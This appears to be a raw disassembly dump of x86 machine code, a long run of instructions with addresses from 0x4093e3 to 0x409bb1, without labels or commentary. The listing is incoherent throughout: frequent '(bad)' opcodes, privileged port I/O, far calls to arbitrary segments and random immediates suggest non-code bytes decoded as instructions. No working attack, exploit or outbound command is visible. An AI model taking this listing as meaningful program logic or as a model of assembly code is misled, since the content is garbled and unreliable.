  4093e3:	sbb    BYTE PTR [bx+di],0x33
  4093e7:	pop    es
  4093e8:	mov    ah,0x78
  4093ea:	cmp    BYTE PTR [eax+edi*1],cl
  4093ed:	jno    0x4093d2
  4093ef:	loopne 0x40945e
  4093f1:	mov    edi,0x3b82faeb
  4093f6:	popf   
  4093f7:	(bad)  
  4093f8:	iret   
  4093f9:	adc    eax,0xcea27f38
  4093fe:	ja     0x409427
  409400:	les    edx,FWORD PTR ds:0x45da709b
  409406:	ins    DWORD PTR es:[edi],dx
  409407:	mov    esp,0xd8400fef
  40940c:	jnp    0x40940a
  40940e:	adc    al,0xf5
  409410:	out    dx,al
  409411:	fisub  WORD PTR [ebx+0x6abfa7a8]
  409417:	xlat   BYTE PTR ds:[ebx]
  409418:	jp     0x409498
  40941a:	and    edi,edx
  40941c:	mov    esi,0x11ac1722
  409421:	loopne 0x40940a
  409423:	or     DWORD PTR [eax+ebx*1+0x65131fdc],ebp
  40942a:	mov    cs,WORD PTR [ecx-0x2f]
  40942d:	mov    BYTE PTR [ebx],al
  40942f:	pop    edi
  409430:	jo     0x409481
  409432:	jns    0x409456
  409434:	(bad)  
  409435:	in     al,0xea
  409437:	or     ah,0xe0
  40943a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40943b:	or     bl,BYTE PTR [edx+0x19]
  40943e:	call   0xdadfd6e2
  409443:	hlt    
  409444:	js     0x4093f6
  409446:	imul   esi,ebp,0x794ff7b
  40944c:	leave  
  40944d:	sub    BYTE PTR [ebx-0xb],dl
  409450:	pushf  
  409451:	xchg   esi,eax
  409452:	cmp    eax,0x63c4659a
  409457:	pusha  
  409458:	jl     0x4094b4
  40945a:	ror    BYTE PTR ds:0x1984fe6b,0xb2
  409461:	and    ch,bl
  409463:	cwde   
  409464:	or     al,0x6c
  409466:	lea    edx,[eax]
  409468:	add    al,cl
  40946a:	and    DWORD PTR [eax],edi
  40946c:	jbe    0x4094ce
  40946e:	aad    0x2a
  409470:	out    0x2c,al
  409472:	into   
  409473:	mov    al,ds:0xf2d3513f
  409478:	scas   eax,DWORD PTR es:[edi]
  409479:	stc    
  40947a:	sbb    eax,0x57208362
  40947f:	stc    
  409480:	or     al,BYTE PTR [esi-0x547efcc7]
  409486:	xor    ch,bl
  409488:	add    al,0x40
  40948a:	dec    esi
  40948b:	xor    ebx,ecx
  40948d:	loop   0x409410
  40948f:	inc    edi
  409490:	stos   BYTE PTR es:[edi],al
  409491:	sbb    al,0xc6
  409494:	xor    ch,BYTE PTR [esi]
  409496:	push   ecx
  409497:	cmc    
  409498:	jns    0x4094dc
  40949a:	add    esp,0x6e0bea65
  4094a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094a1:	cmc    
  4094a2:	sbb    BYTE PTR [ebx],ah
  4094a4:	shr    esi,cl
  4094a6:	stos   BYTE PTR es:[edi],al
  4094a7:	out    dx,eax
  4094a8:	jecxz  0x40951c
  4094aa:	retf   0x31c6
  4094ad:	cli    
  4094ae:	add    ebx,edx
  4094b0:	ret    0x7ea0
  4094b3:	jnp    0x4094ae
  4094b5:	pop    ds
  4094b6:	pop    edi
  4094b7:	ror    BYTE PTR [ecx],1
  4094b9:	imul   ebx,DWORD PTR [ebx],0xaa3b7c57
  4094bf:	mov    eax,0xb2c30d2e
  4094c4:	ins    DWORD PTR es:[edi],dx
  4094c5:	pop    ebp
  4094c6:	sbb    eax,DWORD PTR [edx-0x17]
  4094c9:	add    eax,0xf2661934
  4094ce:	in     al,0x21
  4094d0:	sbb    eax,DWORD PTR [eax-0x28]
  4094d3:	sub    eax,0xa9547d12
  4094d8:	sbb    al,0x8f
  4094da:	lock adc eax,0xbd17c63e
  4094e0:	fldenv [edi+eiz*4-0x29f08494]
  4094e7:	dec    ebp
  4094e8:	(bad)  
  4094e9:	push   0xffffffa2
  4094eb:	imul   ecx,DWORD PTR [ebp+0x5b5b5eb3],0xffffff8d
  4094f2:	fidivr DWORD PTR [edi+0x261d8fa6]
  4094f8:	xor    cl,BYTE PTR [ecx-0x76]
  4094fb:	mov    dl,0xbd
  4094fd:	pop    esp
  4094fe:	and    dh,0x3f
  409501:	sub    dl,cl
  409503:	addr16 lock loope 0x409586
  409507:	and    BYTE PTR [eax+0x2901fd6],ah
  40950d:	push   ebp
  40950e:	aaa    
  40950f:	xchg   esi,eax
  409510:	xchg   BYTE PTR [ebx],bl
  409512:	sbb    BYTE PTR [edx],al
  409514:	adc    ebx,DWORD PTR [ebp+0x25e4ac24]
  40951a:	fistp  WORD PTR [esp+ebp*8-0x7a]
  40951e:	shl    DWORD PTR [eax-0x64],0x58
  409522:	in     eax,0x4e
  409524:	test   BYTE PTR [ecx+eiz*8-0x4cd5c10a],0xb5
  40952c:	jnp    0x409547
  40952e:	ret    
  40952f:	clc    
  409530:	ins    DWORD PTR es:[edi],dx
  409531:	pop    esi
  409532:	ss (bad) 
  409534:	pop    eax
  409535:	shr    DWORD PTR [eax+0x32],0x16
  409539:	rcr    BYTE PTR [ebx+0x6e],cl
  40953c:	out    0x2f,eax
  40953e:	xchg   ecx,eax
  40953f:	pop    edx
  409540:	pop    ds
  409541:	mov    bl,0x45
  409543:	mov    dl,0x73
  409545:	xchg   esp,eax
  409546:	sbb    eax,DWORD PTR [ebx+0x16100647]
  40954c:	out    dx,al
  40954d:	add    eax,0x9c6c16d5
  409552:	mov    eax,0xaa6bc0c9
  409557:	jp     0x409545
  409559:	lock ins BYTE PTR es:[edi],dx
  40955b:	mov    al,ds:0x121aabe6
  409560:	dec    ebx
  409561:	xchg   edi,eax
  409562:	xchg   edx,eax
  409563:	sub    eax,0x5bd7a645
  409568:	xor    al,0xf9
  40956a:	push   ss
  40956b:	mov    esp,ecx
  40956d:	and    al,0xf
  40956f:	call   0x6858:0x31379f53
  409576:	push   esi
  409577:	push   ebp
  409578:	inc    BYTE PTR [ebp+0x71]
  40957b:	sub    ch,bh
  40957d:	shr    esp,cl
  40957f:	push   ebx
  409580:	ret    0xbab4
  409583:	cli    
  409584:	inc    edx
  409585:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409586:	mov    ebx,0xadc0702d
  40958b:	sub    DWORD PTR ds:0x85ca521e,edi
  409591:	repnz cwde 
  409593:	fnstenv [esi+edi*8+0x5b]
  409597:	fcomi  st,st(4)
  409599:	hlt    
  40959a:	arpl   ax,cx
  40959c:	and    eax,0x85b390ef
  4095a1:	popf   
  4095a2:	sub    DWORD PTR [edx-0x50ae21f5],0xffffff9b
  4095a9:	mov    al,0x6b
  4095ab:	or     al,0x75
  4095ad:	xor    eax,0xdec89e22
  4095b2:	(bad)  
  4095b3:	mov    esp,0xce29921c
  4095b8:	fisttp DWORD PTR [ecx+edi*8+0x3a]
  4095bc:	inc    ebp
  4095bd:	test   BYTE PTR [esi+eax*1-0x1cafb833],0x48
  4095c5:	std    
  4095c6:	add    ebx,esi
  4095c8:	or     eax,0xebf555e4
  4095cd:	cmp    dh,BYTE PTR [ebx-0x1d]
  4095d0:	xchg   esi,eax
  4095d1:	add    al,0x1d
  4095d3:	xor    eax,0x292e2c7c
  4095d8:	repz jne 0x4095ca
  4095db:	cmc    
  4095dc:	iret   
  4095dd:	pop    ecx
  4095de:	hlt    
  4095df:	int3   
  4095e0:	test   DWORD PTR [ebx+edi*1-0x54],edx
  4095e4:	dec    ebp
  4095e5:	push   es
  4095e6:	mov    eax,0x3a3a9d20
  4095eb:	mov    ebx,0xf106ecd
  4095f0:	and    edi,DWORD PTR [ecx]
  4095f2:	push   cs
  4095f3:	and    ch,BYTE PTR [edx-0x522f0716]
  4095f9:	sub    DWORD PTR [edi-0x6a],0x69
  4095fd:	sub    al,0xd7
  4095ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409600:	cmc    
  409601:	out    0x70,al
  409603:	bnd jae 0x409638
  409606:	xchg   edx,eax
  409607:	push   edx
  409608:	sub    esi,ebx
  40960a:	add    cl,al
  40960c:	arpl   WORD PTR [eax],bp
  40960e:	xor    eax,ebp
  409610:	inc    ecx
  409611:	inc    esi
  409612:	stos   DWORD PTR es:[edi],eax
  409613:	ret    
  409614:	xchg   ebx,eax
  409615:	das    
  409616:	mov    edx,esi
  409618:	mov    eax,ds:0x9b644f87
  40961d:	dec    ecx
  40961e:	ja     0x4095bc
  409620:	push   eax
  409621:	fidiv  WORD PTR [di-0x2fa4]
  409626:	in     eax,dx
  409627:	int3   
  409628:	test   BYTE PTR [ebp+0x1e55bce7],dh
  40962e:	xor    BYTE PTR [ebp*4+0x41f227d1],0xc5
  409636:	sub    al,0x40
  409638:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409639:	(bad)  [ebx]
  40963b:	push   esp
  40963c:	mov    DWORD PTR [edi],edx
  40963e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40963f:	or     esi,DWORD PTR [bp+di]
  409642:	jno    0x4095e6
  409644:	jnp    0x409651
  409646:	call   0x107aa1fe
  40964b:	dec    edx
  40964c:	xor    eax,DWORD PTR [esi+0x4b]
  40964f:	dec    ebx
  409650:	or     BYTE PTR [edx+0x20],dl
  409653:	stc    
  409654:	je     0x4095e0
  409656:	inc    ebx
  409657:	or     ecx,DWORD PTR [edi]
  409659:	jmp    DWORD PTR [eax]
  40965b:	or     DWORD PTR [edx+eiz*1],edx
  40965e:	push   ebp
  40965f:	lock call 0x3914:0xb5d28386
  409667:	pop    es
  409668:	push   es
  409669:	imul   ebx,DWORD PTR [ebx],0x44b3ca7a
  40966f:	test   eax,0x621eeb47
  409674:	adc    al,0xd4
  409676:	cmp    BYTE PTR ds:0xbbd2758a,bl
  40967c:	mov    edi,esi
  40967e:	imul   DWORD PTR [edi+edi*1]
  409681:	loope  0x409692
  409683:	mov    cl,0xaf
  409685:	test   al,0x4a
  409687:	sub    BYTE PTR [edi+eax*8+0x5cff5ada],bh
  40968e:	jb     0x409661
  409690:	shr    bl,1
  409692:	xor    BYTE PTR [edi+eiz*2+0xd4a098e],al
  409699:	dec    ebx
  40969a:	cmp    al,0xe7
  40969c:	fwait
  40969d:	pop    esp
  40969e:	mov    al,0x80
  4096a0:	xor    ch,al
  4096a2:	add    al,0x54
  4096a4:	(bad)  
  4096a5:	in     al,dx
  4096a6:	and    al,0xd2
  4096a8:	sbb    eax,edi
  4096aa:	mov    dh,0x58
  4096ac:	sahf   
  4096ad:	lods   al,BYTE PTR ds:[esi]
  4096ae:	sub    bh,bh
  4096b0:	mov    cs,WORD PTR [edi+0x2]
  4096b3:	pop    esi
  4096b4:	mov    bl,0x68
  4096b6:	clc    
  4096b7:	sbb    ebx,DWORD PTR [edi+0x61]
  4096ba:	push   eax
  4096bb:	sbb    esp,DWORD PTR [esi-0x3b3f49e7]
  4096c1:	mov    ah,0x22
  4096c3:	addr16 dec edx
  4096c5:	xchg   edi,eax
  4096c6:	aas    
  4096c7:	dec    ecx
  4096c8:	jnp    0x4096f7
  4096ca:	in     al,0xb9
  4096cc:	jle    0x409730
  4096ce:	lods   eax,DWORD PTR ds:[esi]
  4096cf:	pop    ebx
  4096d0:	jb     0x409699
  4096d2:	aaa    
  4096d3:	cmp    al,0x83
  4096d5:	xor    BYTE PTR [esi+0x1],ch
  4096d8:	jg     0x4096f0
  4096da:	in     eax,0xcc
  4096dc:	and    al,0xf4
  4096de:	pop    edx
  4096df:	mov    dl,BYTE PTR [ebx-0x17]
  4096e2:	fdivr  QWORD PTR [ecx]
  4096e4:	test   BYTE PTR [esi],ch
  4096e6:	jge    0x409731
  4096e8:	mov    ebp,edi
  4096ea:	fsub   DWORD PTR [eax-0x7bcea620]
  4096f0:	cs popf 
  4096f2:	imul   edx,ebp,0x13683363
  4096f8:	adc    esp,DWORD PTR [esi+0x71]
  4096fb:	push   ecx
  4096fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096fd:	popa   
  4096fe:	adc    ebp,DWORD PTR [ebp-0x2e]
  409701:	retf   0x614a
  409704:	pop    eax
  409705:	in     al,dx
  409706:	adc    BYTE PTR [edx-0xa31fe6],ch
  40970c:	out    dx,eax
  40970d:	add    DWORD PTR ds:0x3f2d974d,0x3527de15
  409717:	or     al,cl
  409719:	es fs cmc 
  40971c:	inc    eax
  40971d:	adc    edx,eax
  40971f:	mov    eax,ds:0xc43620d1
  409724:	add    eax,0x6a86de60
  409729:	sub    BYTE PTR [esi+0x50f81802],0x5b
  409730:	xor    ah,BYTE PTR [edi+ebp*8-0x55e88790]
  409737:	adc    ebx,DWORD PTR [edx]
  409739:	or     edx,DWORD PTR [edi-0x6bc1ef4f]
  40973f:	and    edi,DWORD PTR [ecx*2+0x10bb4d36]
  409746:	(bad)  
  409747:	lds    edi,FWORD PTR [edx]
  409749:	js     0x40975d
  40974b:	or     ch,BYTE PTR [eax+0x30614706]
  409751:	xor    eax,0xdb32f25e
  409756:	pop    ecx
  409757:	lods   al,BYTE PTR ds:[esi]
  409758:	sbb    BYTE PTR cs:[esi+0x3830e9b5],0xab
  409760:	xlat   BYTE PTR ds:[ebx]
  409761:	imul   ebp,esi,0x704a867f
  409767:	adc    eax,0x9c024de1
  40976c:	pop    esp
  40976d:	or     bl,BYTE PTR [ecx+0x5d8123d7]
  409773:	inc    esp
  409774:	retf   0x427f
  409777:	lock sti 
  409779:	push   ss
  40977a:	adc    al,0x6d
  40977c:	xchg   BYTE PTR [eax],ch
  40977e:	mov    eax,ds:0x7619399b
  409783:	add    DWORD PTR [edi+0x3c],0x28
  409787:	inc    eax
  409788:	sub    BYTE PTR [eax+ecx*4-0x4c],bl
  40978c:	syscall 
  40978e:	add    DWORD PTR [eax+0x398e7cde],eax
  409794:	lea    ebp,[edi-0x5ae37586]
  40979a:	push   edx
  40979b:	repz cmp eax,0x737db025
  4097a1:	mov    WORD PTR [edx-0x529d238e],?
  4097a7:	inc    esp
  4097a8:	and    eax,0xe824c020
  4097ad:	jb     0x409812
  4097af:	shl    BYTE PTR ds:0xd45ec207,cl
  4097b5:	dec    ecx
  4097b6:	and    ebx,edi
  4097b8:	xor    DWORD PTR [ebx+0x7c680fe3],edi
  4097be:	aad    0x46
  4097c0:	or     DWORD PTR [ecx+0x3f46c11a],0x270bc02e
  4097ca:	sub    BYTE PTR [ecx],bh
  4097cc:	int3   
  4097cd:	or     esi,DWORD PTR [ebp+0x24]
  4097d0:	lea    edi,[ebp-0x7dc40b80]
  4097d6:	retf   
  4097d7:	mov    cl,0xcd
  4097d9:	cmp    BYTE PTR [eax-0x33],bh
  4097dc:	inc    edi
  4097dd:	aaa    
  4097de:	jg     0x4097a3
  4097e0:	dec    esi
  4097e1:	mov    ch,0x4a
  4097e3:	test   al,0xa8
  4097e5:	mov    ecx,0x4081587d
  4097ea:	inc    esp
  4097eb:	sbb    ebx,DWORD PTR [edi]
  4097ed:	int3   
  4097ee:	imul   esi,ebp,0x77
  4097f1:	or     bh,dl
  4097f3:	mov    dh,0xc2
  4097f5:	das    
  4097f6:	shl    DWORD PTR [eax+0x4a],cl
  4097f9:	loop   0x409853
  4097fb:	shr    BYTE PTR [ebx],cl
  4097fd:	dec    ebp
  4097fe:	mov    ebp,0xafd9185
  409803:	jg     0x4097f2
  409805:	rcr    BYTE PTR [eax+0x23],cl
  409808:	popa   
  409809:	je     0x40983c
  40980b:	mov    DWORD PTR [ecx+edx*8],0x5b57b910
  409812:	(bad)  
  409813:	jp     0x409873
  409815:	xchg   ecx,eax
  409816:	loop   0x409823
  409818:	hlt    
  409819:	xor    eax,0xfc5c7153
  40981e:	and    al,0x45
  409820:	and    DWORD PTR [ebp+ebp*2+0x55],ecx
  409824:	mov    bh,0x3f
  409826:	add    DWORD PTR [edx+edi*4-0xe655933],esp
  40982d:	dec    ebp
  40982e:	in     eax,0x9d
  409830:	inc    ebp
  409831:	mov    DWORD PTR [edi+edx*1+0x24],edx
  409835:	inc    esp
  409836:	inc    ecx
  409837:	js     0x409848
  409839:	inc    edi
  40983a:	xor    BYTE PTR ss:[edi+0x1986bd60],ah
  409841:	bnd jp 0x4097de
  409844:	sub    eax,0x17889321
  409849:	or     al,0x1
  40984b:	fcmovu st,st(4)
  40984d:	mov    BYTE PTR [ecx-0x13834c44],dh
  409853:	aam    0x3e
  409855:	pop    ebp
  409856:	div    DWORD PTR [edx+0x2dfcbaf7]
  40985c:	xchg   DWORD PTR [ebx],ebp
  40985e:	jae    0x4098cd
  409860:	sub    DWORD PTR [ebp+0x13ca8123],ecx
  409866:	cmp    BYTE PTR [eax+0x7425d244],dh
  40986c:	arpl   bx,ax
  40986e:	cmp    DWORD PTR [eax+0xa],ebx
  409871:	adc    al,BYTE PTR [ebp+0x471463f3]
  409877:	fisub  WORD PTR [edi]
  409879:	gs cwde 
  40987b:	stos   DWORD PTR es:[edi],eax
  40987c:	bound  esi,QWORD PTR [ecx-0x62]
  40987f:	or     dh,BYTE PTR [esi+0x55ca2543]
  409885:	push   ecx
  409886:	jge    0x4098b3
  409888:	or     esi,ebp
  40988a:	inc    edi
  40988b:	in     eax,0xd9
  40988d:	cdq    
  40988e:	sub    ebp,DWORD PTR [ebp-0x636ec534]
  409894:	mov    al,ds:0xcf6a1bef
  409899:	imul   ecx,DWORD PTR [edi],0x22ab2dba
  40989f:	dec    esi
  4098a0:	and    al,0x43
  4098a2:	mov    ds:0xdfe185f7,eax
  4098a7:	fsub   DWORD PTR [esi]
  4098a9:	fstp   DWORD PTR [ebp+0x4c6b9659]
  4098af:	or     BYTE PTR [edx],bh
  4098b1:	in     al,0xbf
  4098b3:	cmp    esp,esi
  4098b5:	add    DWORD PTR [edx+0x2b628680],esi
  4098bb:	test   al,0x77
  4098bd:	cmp    al,0x52
  4098bf:	loop   0x409854
  4098c1:	sbb    BYTE PTR [eax+ebp*2],ah
  4098c4:	pop    ecx
  4098c5:	leave  
  4098c6:	ror    BYTE PTR [esi-0x1891ab59],1
  4098cc:	mov    esi,0x4a265870
  4098d1:	jb     0x40994b
  4098d3:	ss dec ebp
  4098d5:	in     eax,dx
  4098d6:	lods   al,BYTE PTR ds:[esi]
  4098d7:	jl     0x40990b
  4098d9:	mov    esp,0xdff99032
  4098de:	stos   DWORD PTR es:[edi],eax
  4098df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098e0:	xchg   BYTE PTR [ebx-0x524379b8],bh
  4098e6:	cwde   
  4098e7:	lds    eax,FWORD PTR [eax]
  4098e9:	or     edi,DWORD PTR [edi+edi*4]
  4098ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098ed:	sub    BYTE PTR [ebx-0x61],ah
  4098f0:	test   al,0x2d
  4098f2:	mov    dl,0x95
  4098f4:	sub    eax,0xe4135fae
  4098f9:	pop    ebx
  4098fa:	add    dl,BYTE PTR [esi]
  4098fc:	sbb    cl,ch
  4098fe:	fs mov edi,0x3d723f38
  409904:	jne    0x40991a
  409906:	push   edx
  409907:	lahf   
  409908:	aam    0xb6
  40990a:	dec    ebp
  40990b:	sahf   
  40990c:	dec    eax
  40990d:	outs   dx,DWORD PTR ds:[esi]
  40990e:	daa    
  40990f:	mov    ch,0xf8
  409911:	outs   dx,BYTE PTR ds:[esi]
  409912:	arpl   WORD PTR [edx],bp
  409914:	xor    DWORD PTR [ecx-0x21],ecx
  409917:	dec    esp
  409918:	dec    esi
  409919:	call   0xa710e9de
  40991e:	mov    dh,0x18
  409920:	xchg   ebx,eax
  409921:	sbb    eax,DWORD PTR [edx]
  409923:	lea    edi,[ecx]
  409925:	loop   0x40995c
  409927:	mov    dh,0x65
  409929:	out    dx,eax
  40992a:	test   DWORD PTR [ecx],ebx
  40992c:	(bad)  
  40992d:	fsubrp st(3),st
  40992f:	lahf   
  409930:	data16 lods al,BYTE PTR ds:[si]
  409933:	or     cl,BYTE PTR [ecx]
  409935:	mov    ss,WORD PTR [edx-0x54]
  409938:	dec    esi
  409939:	iret   
  40993a:	popa   
  40993b:	stc    
  40993c:	inc    eax
  40993d:	push   0xe80c2aeb
  409942:	neg    BYTE PTR [ecx]
  409944:	jbe    0x409944
  409946:	dec    ebp
  409947:	jmp    0x285cf897
  40994c:	imul   edi,DWORD PTR [ecx-0x67bb4107],0x3bc08376
  409956:	rcl    DWORD PTR [esp+ebp*4],0x86
  40995a:	sbb    dl,BYTE PTR [edx]
  40995c:	arpl   WORD PTR [ebx],cx
  40995e:	adc    eax,0x307cee36
  409963:	fistp  WORD PTR [ebp-0x1b8c0a99]
  409969:	mov    ds:0xe3d5d5b6,al
  40996e:	rcl    al,1
  409970:	div    esp
  409972:	les    ebp,FWORD PTR es:[ebx+eax*2+0x6]
  409977:	call   0x8b3e:0x9ae9ca02
  40997e:	out    dx,eax
  40997f:	mov    al,BYTE PTR [eax]
  409981:	adc    al,0xd8
  409983:	sbb    edi,DWORD PTR [ebp+0x30c5bf53]
  409989:	push   ebx
  40998a:	push   esp
  40998b:	mov    ds:0xe4acfb62,al
  409990:	dec    esp
  409991:	cmp    eax,0x3775bf3f
  409996:	inc    esp
  409997:	std    
  409998:	retf   
  409999:	in     al,dx
  40999a:	jnp    0x409953
  40999c:	jns    0x409975
  40999e:	test   ebp,ecx
  4099a0:	ret    
  4099a1:	stos   DWORD PTR es:[edi],eax
  4099a2:	cmp    dl,BYTE PTR [edx]
  4099a4:	clc    
  4099a5:	(bad)  
  4099a6:	loope  0x409a20
  4099a8:	pushf  
  4099a9:	sar    ch,cl
  4099ab:	mov    ecx,0x93e161be
  4099b0:	(bad)  
  4099b1:	sub    al,0x5c
  4099b3:	xlat   BYTE PTR ds:[ebx]
  4099b4:	test   BYTE PTR [esi-0x9],0x42
  4099b8:	int3   
  4099b9:	xor    ah,BYTE PTR [ecx-0x6f]
  4099bc:	cmc    
  4099bd:	add    ch,dl
  4099bf:	into   
  4099c0:	adc    esi,edi
  4099c2:	mov    WORD PTR ds:0x4189dcef,gs
  4099c8:	and    bl,ah
  4099ca:	push   0x2f
  4099cc:	pop    edx
  4099cd:	loop   0x409959
  4099cf:	hlt    
  4099d0:	fldlg2 
  4099d2:	rcr    DWORD PTR [ebp-0x46],1
  4099d5:	or     BYTE PTR [ebp+0x32fd073b],ah
  4099db:	(bad)  
  4099dd:	in     al,0x69
  4099df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099e0:	out    0x50,al
  4099e2:	mov    ch,0xf7
  4099e4:	cwde   
  4099e5:	lods   al,BYTE PTR ds:[esi]
  4099e6:	mov    BYTE PTR [ebp+0x30ad5879],ch
  4099ec:	out    0x3e,al
  4099ee:	es add eax,0x7febc6de
  4099f4:	sbb    al,0x4e
  4099f6:	out    0xb,al
  4099f8:	rcr    DWORD PTR [ecx+0x32],1
  4099fb:	pop    edi
  4099fc:	dec    edi
  4099fd:	cmc    
  4099fe:	inc    edi
  4099ff:	out    dx,al
  409a00:	int3   
  409a01:	jb     0x4099b0
  409a03:	mov    dl,bh
  409a05:	pop    ebp
  409a06:	ss xchg esp,eax
  409a08:	imul   BYTE PTR [ecx-0x40024a08]
  409a0e:	mov    eax,0xc0ef2bb5
  409a13:	sbb    BYTE PTR [edi-0x3f9941e2],bl
  409a19:	bound  eax,QWORD PTR [ecx-0x40729b7c]
  409a1f:	jns    0x409a7a
  409a21:	sub    ch,BYTE PTR [edx-0x2]
  409a24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a25:	jg     0x4099aa
  409a27:	popf   
  409a28:	add    BYTE PTR [edx],dl
  409a2a:	sub    esi,DWORD PTR [edx-0x399427d1]
  409a30:	add    DWORD PTR [esp+ebp*1-0xc],0xffffffd9
  409a35:	sbb    al,0x20
  409a37:	ins    DWORD PTR es:[edi],dx
  409a38:	xor    eax,DWORD PTR [ecx-0x8]
  409a3b:	retf   0x5214
  409a3e:	in     eax,dx
  409a3f:	div    DWORD PTR [esi-0x15]
  409a42:	les    eax,FWORD PTR [ecx]
  409a44:	xor    ecx,esi
  409a46:	sbb    bl,dh
  409a48:	cmp    esp,DWORD PTR [ebx-0x4b28328d]
  409a4e:	out    dx,al
  409a4f:	xor    dl,al
  409a51:	cmp    cl,BYTE PTR [edi-0x5a4681a8]
  409a57:	dec    edi
  409a58:	or     al,0x22
  409a5a:	sbb    ebx,DWORD PTR [ebp-0x66d1d063]
  409a60:	scas   al,BYTE PTR es:[edi]
  409a61:	test   al,0x80
  409a63:	iret   
  409a64:	adc    ah,dh
  409a66:	test   BYTE PTR es:[ebx],dl
  409a69:	in     al,dx
  409a6a:	inc    esi
  409a6b:	addr16 sub eax,ecx
  409a6e:	repnz dec edx
  409a70:	cld    
  409a71:	pushf  
  409a72:	jo     0x409a09
  409a74:	ss mov edi,0xbfb25012
  409a7a:	jmp    0x130:0xf63d1e75
  409a81:	(bad)  
  409a82:	clc    
  409a83:	cmp    al,0xd1
  409a85:	mov    ebx,0xdaac4eb0
  409a8a:	pop    ebx
  409a8b:	frstor [edi]
  409a8d:	(bad)  
  409a8e:	xor    edx,eax
  409a90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a91:	add    dl,dh
  409a93:	aad    0xc6
  409a95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a96:	xchg   ebx,eax
  409a97:	scas   eax,DWORD PTR es:[edi]
  409a98:	(bad)  
  409a99:	sub    al,0xd1
  409a9b:	stos   BYTE PTR es:[edi],al
  409a9c:	test   DWORD PTR [edx-0x5dd2613],esi
  409aa2:	stc    
  409aa3:	aam    0x90
  409aa5:	(bad)  
  409aa6:	aaa    
  409aa7:	or     BYTE PTR [edx],bh
  409aa9:	rol    DWORD PTR [ebp-0x56],0xe9
  409aad:	xchg   edi,eax
  409aae:	push   eax
  409aaf:	xchg   ebp,eax
  409ab0:	jle    0x409ad8
  409ab2:	fdivr  st(2),st
  409ab4:	call   0xdde9:0x2f010fa9
  409abb:	les    esp,FWORD PTR [esi+0x4ecef2c1]
  409ac1:	je     0x409a8f
  409ac3:	mov    cl,0xf5
  409ac5:	sub    al,0x4c
  409ac7:	xchg   BYTE PTR [edx-0x2b06d69c],cl
  409acd:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  409acf:	test   eax,0xd29e31d2
  409ad4:	mov    ds:0xae4285,eax
  409ad9:	xchg   ebx,ebp
  409adb:	scas   al,BYTE PTR es:[edi]
  409adc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409add:	call   0x8b1b:0x7783e79
  409ae4:	jae    0x409b40
  409ae6:	or     bh,BYTE PTR [ebx]
  409ae8:	leave  
  409ae9:	push   DWORD PTR [eax+0x50bd2567]
  409aef:	xchg   esp,eax
  409af0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409af1:	ja     0x409b18
  409af3:	adc    ebx,ecx
  409af5:	leave  
  409af6:	xchg   ebp,eax
  409af7:	test   al,0x2e
  409af9:	mov    bl,0xfb
  409afb:	sub    cl,BYTE PTR [edi-0x3d]
  409afe:	adc    esp,DWORD PTR [eax]
  409b00:	mov    dl,al
  409b02:	rep outs dx,DWORD PTR ds:[esi]
  409b04:	sub    bh,ch
  409b06:	mov    esp,0x86366e3
  409b0b:	adc    eax,0x1b60e598
  409b10:	and    edx,eax
  409b12:	mov    ds:0x2b4c99d,eax
  409b17:	inc    ebx
  409b18:	aam    0x63
  409b1a:	mov    ds:0x366515ef,al
  409b1f:	lock sub DWORD PTR [ecx],ebx
  409b22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b23:	retf   
  409b24:	xchg   esi,eax
  409b25:	mov    eax,0x333cc780
  409b2a:	mov    al,ds:0x5f80d5b6
  409b2f:	pop    ebp
  409b30:	and    eax,0xbfbfcdd4
  409b35:	scas   al,BYTE PTR es:[edi]
  409b36:	aam    0x8c
  409b38:	je     0x409ac3
  409b3a:	inc    esi
  409b3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b3c:	mov    esi,0x6a0d4f16
  409b41:	fdiv   QWORD PTR [esi+0x3e9d302b]
  409b47:	enter  0xb33,0x8e
  409b4b:	xchg   edx,eax
  409b4c:	add    al,0xc5
  409b4e:	dec    edi
  409b4f:	adc    ch,ch
  409b51:	cmp    ebx,DWORD PTR gs:[esi+0x51e02ee2]
  409b58:	or     edi,DWORD PTR [ebp-0x4a]
  409b5b:	xchg   edi,eax
  409b5c:	cwde   
  409b5d:	shl    DWORD PTR [edx+edi*8],0x26
  409b61:	popa   
  409b62:	cmp    al,al
  409b64:	cdq    
  409b65:	repnz out dx,al
  409b67:	cmp    esi,DWORD PTR [ebp+eiz*1+0x65574fe8]
  409b6e:	jecxz  0x409bba
  409b70:	xchg   ecx,eax
  409b71:	add    DWORD PTR [eax-0x6e],edx
  409b74:	(bad)  
  409b75:	div    ebp
  409b77:	mov    edx,edx
  409b79:	test   esp,edi
  409b7b:	add    al,0x93
  409b7d:	clc    
  409b7e:	inc    ecx
  409b7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b80:	loop   0x409b33
  409b82:	sub    cl,BYTE PTR [esi-0x54f47611]
  409b88:	jl     0x409b17
  409b8a:	add    DWORD PTR [ecx-0x7],esi
  409b8d:	ror    BYTE PTR [esi-0x23bdb86b],0x14
  409b94:	pop    ebp
  409b95:	sahf   
  409b96:	loop   0x409baa
  409b98:	arpl   WORD PTR [ebx-0x6e],si
  409b9b:	lock jg 0x409bad
  409b9e:	out    0xcb,al
  409ba0:	(bad)
  409ba5:	mov    dl,0x5e
  409ba7:	and    esp,ebx
  409ba9:	cld    
  409baa:	test   bl,bl
  409bac:	adc    BYTE PTR [eax],al
  409bae:	and    bl,cl
  409bb0:	push   ebx
  409bb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
